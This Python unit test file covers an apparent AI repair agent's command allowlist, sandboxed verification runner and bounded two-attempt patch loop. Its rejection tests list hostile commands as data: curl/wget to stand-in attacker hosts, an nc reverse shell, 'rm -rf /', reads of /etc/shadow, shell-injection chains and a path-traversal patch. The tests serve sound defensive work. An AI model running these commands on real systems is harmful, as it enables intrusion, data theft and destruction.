"""Unit tests for verification runner and bounded repair loop (agent.runner)."""
import json
import os
import tempfile
from unittest.mock import MagicMock
from typing import Tuple

from agent.models import (
    AnalysisResult,
    FixSuggestion,
    FilePatch,
    PatchProposal,
    PatchStatus,
    PatchValidationResult,
    VerificationStatus,
)
from agent.runner import (
    is_command_allowlisted,
    copy_disposable_repo,
    apply_patch_to_disposable_tree,
    VerificationRunner,
    run_repair_loop,
)
from agent.sandbox import SandboxIsolationBackend, SandboxTimeoutError


class MockSandbox(SandboxIsolationBackend):
    """Deterministic in-memory mock sandbox backend for unit tests."""

    def __init__(
        self,
        available: bool = True,
        exit_code: int = 0,
        stdout: str = "",
        stderr: str = "",
        timeout: bool = False,
    ):
        self._available = available
        self._exit_code = exit_code
        self._stdout = stdout
        self._stderr = stderr
        self._timeout = timeout
        self.executed_commands = []

    def is_available(self) -> Tuple[bool, str]:
        if self._available:
            return True, "Mock sandbox ready."
        return False, "Mock sandbox unavailable."

    def execute(self, repo_dir, command, timeout=180, env=None):
        self.executed_commands.append(list(command))
        if self._timeout:
            raise SandboxTimeoutError(f"Command timed out after {timeout} seconds.")
        return self._exit_code, self._stdout, self._stderr


# --- 1. Command Allowlisting Tests ---

def test_is_command_allowlisted_allowed():
    """Verify standard test and lint commands are permitted."""
    allowed = [
        "pytest",
        "pytest sample-app/tests/",
        "pytest -v tests/unit/",
        "python -m pytest",
        "python -m pytest sample-app/tests/ -v",
        "python3 -m pytest",
        "flake8",
        "flake8 sample-app/",
        "python -m flake8",
        "python3 -m flake8 sample-app/",
    ]
    for cmd in allowed:
        assert is_command_allowlisted(cmd), f"Expected allowlisted: {cmd}"


def test_is_command_allowlisted_rejected_binaries():
    """Verify arbitrary binaries and dangerous tools are rejected."""
    forbidden = [
        "curl http://attacker.com/leak",
        "wget http://malicious.com/payload.sh",
        "bash -c 'rm -rf /'",
        "sh exploit.sh",
        "nc -e /bin/sh 10.0.0.1 4444",
        "cat /etc/shadow",
        "docker run -v /:/host alpine",
        "git push origin master",
        "pip install malicious-package",
    ]
    for cmd in forbidden:
        assert not is_command_allowlisted(cmd), f"Expected forbidden: {cmd}"


def test_is_command_allowlisted_rejected_shell_injection():
    """Verify commands containing shell metacharacters and chaining are rejected."""
    injections = [
        "pytest; rm -rf /",
        "pytest && curl evil.com",
        "pytest || wget evil.com",
        "pytest | nc evil.com 1234",
        "pytest > /etc/passwd",
        "pytest < /dev/urandom",
        "pytest `whoami`",
        "pytest $(whoami)",
        "pytest ${ENV_VAR}",
        "pytest eval('evil')",
        "pytest exec('evil')",
        "",
        "   ",
    ]
    for cmd in injections:
        assert not is_command_allowlisted(cmd), f"Expected rejected injection: {cmd}"


def test_is_command_allowlisted_rejected_plugins_overrides_and_paths():
    """Verify that pytest plugins, configuration overrides, and arbitrary paths are rejected."""
    adversarial = [
        # Pytest plugin loading and config overrides
        "pytest -p evil_plugin",
        "pytest --override-ini=addopts=--help",
        "pytest -o pythonpath=/evil",
        "pytest -c /tmp/evil.ini",
        "pytest --config-file=bad.ini",
        "pytest --rootdir=/root",
        "pytest --import-mode=importlib",
        "pytest --basetemp=/tmp/bad",
        "pytest --pdb",
        "pytest --capture=fd",
        # Flake8 configuration overrides
        "flake8 --config=/etc/bad.cfg",
        "flake8 --append-config=/tmp/bad.cfg",
        "flake8 --output-file=/tmp/bad.txt",
        # Arbitrary and traversal paths
        "pytest /etc/shadow",
        "pytest /var/run/docker.sock",
        "pytest ../../escape",
        "pytest C:\\Windows\\System32",
        "flake8 /etc/passwd",
        "flake8 ../../escape",
        # Python invocation with arbitrary module
        "python -m os",
        "python -c 'import os'",
        "python3 -m unittest",
    ]
    for cmd in adversarial:
        assert not is_command_allowlisted(cmd), f"Expected adversarial command to be rejected: {cmd}"


# --- 2. Disposable Repo Copy & Patch Application Tests ---


def test_copy_disposable_repo_excludes_sensitive_and_git():
    """Verify copy_disposable_repo excludes .git, .env, and caches."""
    with tempfile.TemporaryDirectory() as src, tempfile.TemporaryDirectory() as dst:
        # Create sample repo files
        os.makedirs(os.path.join(src, ".git"))
        with open(os.path.join(src, ".git", "config"), "w") as f:
            f.write("git-secret")
        with open(os.path.join(src, ".env"), "w") as f:
            f.write("SECRET=123")
        os.makedirs(os.path.join(src, "pkg"))
        with open(os.path.join(src, "pkg", "app.py"), "w") as f:
            f.write("print('hello')")

        copy_disposable_repo(src, dst)

        assert os.path.isfile(os.path.join(dst, "pkg", "app.py"))
        assert not os.path.exists(os.path.join(dst, ".git"))
        assert not os.path.exists(os.path.join(dst, ".env"))


def test_apply_patch_to_disposable_tree_added_file():
    """Verify apply_patch_to_disposable_tree can create new files."""
    diff = (
        "--- /dev/null\n"
        "+++ b/sample-app/utils.py\n"
        "@@ -0,0 +1,2 @@\n"
        "+def helper():\n"
        "+    return 42\n"
    )
    patch = PatchProposal(
        status=PatchStatus.VALIDATED,
        validation=PatchValidationResult(is_valid=True),
        files=[FilePatch(path="sample-app/utils.py", status="added", diff_content=diff)],
    )
    with tempfile.TemporaryDirectory() as tmp_dir:
        ok, err = apply_patch_to_disposable_tree(tmp_dir, patch)
        assert ok is True
        assert err == ""
        target_path = os.path.join(tmp_dir, "sample-app", "utils.py")
        assert os.path.isfile(target_path)
        with open(target_path, "r", encoding="utf-8") as f:
            content = f.read()
        assert "def helper():" in content
        assert "return 42" in content


def test_apply_patch_to_disposable_tree_modified_file():
    """Verify apply_patch_to_disposable_tree modifies existing file hunks."""
    diff = (
        "--- a/sample-app/app.py\n"
        "+++ b/sample-app/app.py\n"
        "@@ -1,3 +1,3 @@\n"
        " def get_code():\n"
        "-    return 500\n"
        "+    return 200\n"
    )
    patch = PatchProposal(
        status=PatchStatus.VALIDATED,
        validation=PatchValidationResult(is_valid=True),
        files=[FilePatch(path="sample-app/app.py", status="modified", diff_content=diff)],
    )
    with tempfile.TemporaryDirectory() as tmp_dir:
        target_dir = os.path.join(tmp_dir, "sample-app")
        os.makedirs(target_dir)
        file_path = os.path.join(target_dir, "app.py")
        with open(file_path, "w", encoding="utf-8") as f:
            f.write("def get_code():\n    return 500\n")

        ok, err = apply_patch_to_disposable_tree(tmp_dir, patch)
        assert ok is True
        assert err == ""
        with open(file_path, "r", encoding="utf-8") as f:
            new_content = f.read()
        assert "return 200" in new_content
        assert "return 500" not in new_content


def test_apply_patch_to_disposable_tree_mismatch_fails():
    """Verify apply_patch_to_disposable_tree fails gracefully when context does not match."""
    diff = (
        "--- a/sample-app/app.py\n"
        "+++ b/sample-app/app.py\n"
        "@@ -1,3 +1,3 @@\n"
        " def unrelated():\n"
        "-    return 123\n"
        "+    return 456\n"
    )
    patch = PatchProposal(
        status=PatchStatus.VALIDATED,
        validation=PatchValidationResult(is_valid=True),
        files=[FilePatch(path="sample-app/app.py", status="modified", diff_content=diff)],
    )
    with tempfile.TemporaryDirectory() as tmp_dir:
        file_path = os.path.join(tmp_dir, "sample-app", "app.py")
        os.makedirs(os.path.dirname(file_path))
        with open(file_path, "w", encoding="utf-8") as f:
            f.write("def completely_different():\n    return 999\n")

        ok, err = apply_patch_to_disposable_tree(tmp_dir, patch)
        assert ok is False
        assert "failed to match" in err


# --- 3. VerificationRunner Tests ---

def test_verify_rejects_unvalidated_patch():
    """Verify that verify() rejects unvalidated or invalid patch proposals immediately."""
    runner = VerificationRunner(sandbox=MockSandbox())
    patch = PatchProposal(
        status=PatchStatus.REJECTED,
        validation=PatchValidationResult(is_valid=False),
    )
    result = runner.verify(patch)
    assert result.status == VerificationStatus.PATCH_REJECTED
    assert result.is_verified is False
    assert result.exit_code == 1
    assert "safety policy validation" in result.error_message


def test_verify_infrastructure_failure_when_sandbox_unavailable():
    """Verify runner reports INFRASTRUCTURE_FAILURE when container backend is unavailable."""
    sandbox = MockSandbox(available=False)
    runner = VerificationRunner(sandbox=sandbox)
    patch = PatchProposal(
        status=PatchStatus.VALIDATED,
        validation=PatchValidationResult(is_valid=True),
        files=[],
    )
    result = runner.verify(patch)
    assert result.status == VerificationStatus.INFRASTRUCTURE_FAILURE
    assert result.is_verified is False
    assert "Refusing to execute unverified code on host runner" in result.error_message


def test_verify_infrastructure_failure_on_forbidden_command():
    """Verify runner halts with INFRASTRUCTURE_FAILURE if a command is not allowlisted."""
    sandbox = MockSandbox(available=True)
    runner = VerificationRunner(sandbox=sandbox)
    patch = PatchProposal(
        status=PatchStatus.VALIDATED,
        validation=PatchValidationResult(is_valid=True),
        files=[],
    )
    result = runner.verify(patch, commands=["curl http://attacker.com"])
    assert result.status == VerificationStatus.INFRASTRUCTURE_FAILURE
    assert result.is_verified is False
    assert "is forbidden" in result.error_message


def test_verify_timeout():
    """Verify runner reports TIMEOUT with code 124 when sandbox execution times out."""
    sandbox = MockSandbox(available=True, timeout=True)
    runner = VerificationRunner(sandbox=sandbox)
    patch = PatchProposal(
        status=PatchStatus.VALIDATED,
        validation=PatchValidationResult(is_valid=True),
        files=[],
    )
    result = runner.verify(patch, commands=["pytest"])
    assert result.status == VerificationStatus.TIMEOUT
    assert result.is_verified is False
    assert result.exit_code == 124
    assert "timed out" in result.error_message


def test_verify_test_failure():
    """Verify runner reports TEST_FAILED when verification tests exit nonzero."""
    sandbox = MockSandbox(
        available=True,
        exit_code=1,
        stdout="FAILED tests/test_app.py::test_index - AssertionError",
        stderr="",
    )
    runner = VerificationRunner(sandbox=sandbox)
    patch = PatchProposal(
        status=PatchStatus.VALIDATED,
        validation=PatchValidationResult(is_valid=True),
        files=[],
    )
    result = runner.verify(patch, commands=["pytest"])
    assert result.status == VerificationStatus.TEST_FAILED
    assert result.is_verified is False
    assert result.exit_code == 1
    assert "AssertionError" in result.output
    assert "failed with exit code 1" in result.error_message


def test_verify_success():
    """Verify runner reports VERIFIED and is_verified=True when all commands exit 0."""
    sandbox = MockSandbox(
        available=True,
        exit_code=0,
        stdout="3 passed in 0.05s",
        stderr="",
    )
    runner = VerificationRunner(sandbox=sandbox)
    patch = PatchProposal(
        status=PatchStatus.VALIDATED,
        validation=PatchValidationResult(is_valid=True),
        files=[],
    )
    result = runner.verify(patch, commands=["pytest sample-app/tests/"])
    assert result.status == VerificationStatus.VERIFIED
    assert result.is_verified is True
    assert result.exit_code == 0
    assert "3 passed" in result.output
    assert result.error_message is None
    # Truthfulness statement verified
    assert "Passing verification proves ONLY" in result.truthfulness_statement


def test_verify_working_tree_immutability():
    """CRITICAL: verify that the user's host working directory is 100% untouched."""
    with tempfile.TemporaryDirectory() as host_repo:
        app_file = os.path.join(host_repo, "app.py")
        with open(app_file, "w") as f:
            f.write("ORIGINAL_CONTENT = True\n")

        diff = (
            "--- a/app.py\n"
            "+++ b/app.py\n"
            "@@ -1 +1 @@\n"
            "-ORIGINAL_CONTENT = True\n"
            "+ORIGINAL_CONTENT = False\n"
        )
        patch = PatchProposal(
            status=PatchStatus.VALIDATED,
            validation=PatchValidationResult(is_valid=True),
            files=[FilePatch(path="app.py", status="modified", diff_content=diff)],
        )

        sandbox = MockSandbox(available=True, exit_code=0)
        runner = VerificationRunner(sandbox=sandbox, repo_root=host_repo)
        result = runner.verify(patch, commands=["pytest"])

        assert result.is_verified is True
        # Read the file on the host repo
        with open(app_file, "r") as f:
            host_content = f.read()
        # Original content MUST NOT be changed
        assert host_content == "ORIGINAL_CONTENT = True\n"


def test_verify_fails_when_workspace_exceeds_disk_quota():
    """Verify that runner fails closed with INFRASTRUCTURE_FAILURE if workspace exceeds disk quota."""
    from unittest.mock import patch
    sandbox = MockSandbox(available=True, exit_code=0)
    runner = VerificationRunner(sandbox=sandbox)
    patch_obj = PatchProposal(
        status=PatchStatus.VALIDATED,
        validation=PatchValidationResult(is_valid=True),
        files=[],
    )
    # Simulate directory size exceeding 500MB
    with patch("agent.runner.get_dir_size_bytes", return_value=600 * 1024 * 1024):
        result = runner.verify(patch_obj, commands=["pytest"])
        assert result.status == VerificationStatus.INFRASTRUCTURE_FAILURE
        assert result.is_verified is False
        assert "exceeded disk quota ceiling" in result.error_message


# --- 4. Bounded 2-Attempt Repair Loop Tests ---


def test_run_repair_loop_success_attempt_1():
    """Verify that when Attempt 1 passes verification, no retry occurs."""
    diagnosis = AnalysisResult(
        severity="high",
        failure_types=["test"],
        root_cause="AssertionError",
        fixes=[FixSuggestion(type="test", title="Fix assertion", description="Change 500 to 200")],
        confidence="high",
    )
    sandbox = MockSandbox(available=True, exit_code=0, stdout="3 passed")

    with tempfile.TemporaryDirectory() as host_repo:
        os.makedirs(os.path.join(host_repo, "sample-app"), exist_ok=True)
        with open(os.path.join(host_repo, "sample-app", "app.py"), "w") as f:
            f.write("return 500\n")

        valid_patch_json = json.dumps({
            "explanation": "Fix assertion in sample-app/app.py",
            "diff": (
                "--- a/sample-app/app.py\n"
                "+++ b/sample-app/app.py\n"
                "@@ -1 +1 @@\n"
                "-return 500\n"
                "+return 200\n"
            ),
        })

        mock_provider = MagicMock()
        mock_provider.generate_text.return_value = valid_patch_json

        final_patch, final_result = run_repair_loop(
            diagnosis=diagnosis,
            repo_root=host_repo,
            sandbox=sandbox,
            provider=mock_provider,
            commands=["pytest"],
        )

        assert final_result.status == VerificationStatus.VERIFIED
        assert final_result.is_verified is True
        assert final_result.attempt == 1
        assert mock_provider.generate_text.call_count == 1


def test_run_repair_loop_self_corrects_attempt_2():
    """Verify that when Attempt 1 fails, failure output is fed to Attempt 2, which succeeds."""
    diagnosis = AnalysisResult(
        severity="high",
        failure_types=["test"],
        root_cause="AssertionError",
        fixes=[FixSuggestion(type="test", title="Fix assertion", description="Change 500 to 200")],
        confidence="high",
    )

    call_count = 0

    class AlternatingMockSandbox(SandboxIsolationBackend):
        def is_available(self):
            return True, "Ready"

        def execute(self, repo_dir, command, timeout=180, env=None):
            nonlocal call_count
            call_count += 1
            if call_count == 1:
                return 1, "FAILED test_app.py", ""
            return 0, "3 passed in 0.05s", ""

    with tempfile.TemporaryDirectory() as host_repo:
        os.makedirs(os.path.join(host_repo, "sample-app"), exist_ok=True)
        with open(os.path.join(host_repo, "sample-app", "app.py"), "w") as f:
            f.write("return 500\n")

        valid_patch_json = json.dumps({
            "explanation": "Fix assertion in sample-app/app.py",
            "diff": (
                "--- a/sample-app/app.py\n"
                "+++ b/sample-app/app.py\n"
                "@@ -1 +1 @@\n"
                "-return 500\n"
                "+return 200\n"
            ),
        })

        mock_provider = MagicMock()
        mock_provider.generate_text.return_value = valid_patch_json

        sandbox = AlternatingMockSandbox()
        final_patch, final_result = run_repair_loop(
            diagnosis=diagnosis,
            repo_root=host_repo,
            sandbox=sandbox,
            provider=mock_provider,
            commands=["pytest"],
        )

        assert final_result.status == VerificationStatus.VERIFIED
        assert final_result.is_verified is True
        assert final_result.attempt == 2
        assert mock_provider.generate_text.call_count == 2
        # Check that Attempt 2 prompt received failure feedback
        call_prompt = mock_provider.generate_text.call_args_list[1][0][0]
        assert "FAILED test_app.py" in call_prompt


def test_run_repair_loop_terminates_after_2_attempts():
    """Verify that when both Attempt 1 and Attempt 2 fail, the loop terminates cleanly."""
    diagnosis = AnalysisResult(
        severity="high",
        failure_types=["test"],
        root_cause="AssertionError",
        fixes=[FixSuggestion(type="test", title="Fix assertion", description="Change 500 to 200")],
        confidence="high",
    )
    sandbox = MockSandbox(available=True, exit_code=1, stdout="STILL FAILING")

    with tempfile.TemporaryDirectory() as host_repo:
        os.makedirs(os.path.join(host_repo, "sample-app"), exist_ok=True)
        with open(os.path.join(host_repo, "sample-app", "app.py"), "w") as f:
            f.write("return 500\n")

        valid_patch_json = json.dumps({
            "explanation": "Fix assertion in sample-app/app.py",
            "diff": (
                "--- a/sample-app/app.py\n"
                "+++ b/sample-app/app.py\n"
                "@@ -1 +1 @@\n"
                "-return 500\n"
                "+return 200\n"
            ),
        })

        mock_provider = MagicMock()
        mock_provider.generate_text.return_value = valid_patch_json

        final_patch, final_result = run_repair_loop(
            diagnosis=diagnosis,
            repo_root=host_repo,
            sandbox=sandbox,
            provider=mock_provider,
            commands=["pytest"],
        )

        assert final_result.status == VerificationStatus.TEST_FAILED
        assert final_result.is_verified is False
        assert final_result.attempt == 2
        # Exactly 2 calls, cleanly bounded
        assert mock_provider.generate_text.call_count == 2


def test_run_repair_loop_aborts_on_policy_rejection():
    """Verify that policy-rejected patches do not trigger blind retries."""
    diagnosis = AnalysisResult(
        severity="high",
        failure_types=["test"],
        root_cause="AssertionError",
        fixes=[],
        confidence="high",
    )
    sandbox = MockSandbox(available=True)

    with tempfile.TemporaryDirectory() as host_repo:
        mock_provider = MagicMock()
        # Returns forbidden path outside repo
        mock_provider.generate_text.return_value = json.dumps({
            "explanation": "Bad path patch",
            "diff": (
                "--- a/../evil.py\n"
                "+++ b/../evil.py\n"
                "@@ -0,0 +1 @@\n"
                "+bad\n"
            ),
        })

        final_patch, final_result = run_repair_loop(
            diagnosis=diagnosis,
            repo_root=host_repo,
            sandbox=sandbox,
            provider=mock_provider,
            commands=["pytest"],
        )

        assert final_result.status == VerificationStatus.PATCH_REJECTED
        assert final_result.is_verified is False
        assert mock_provider.generate_text.call_count == 1
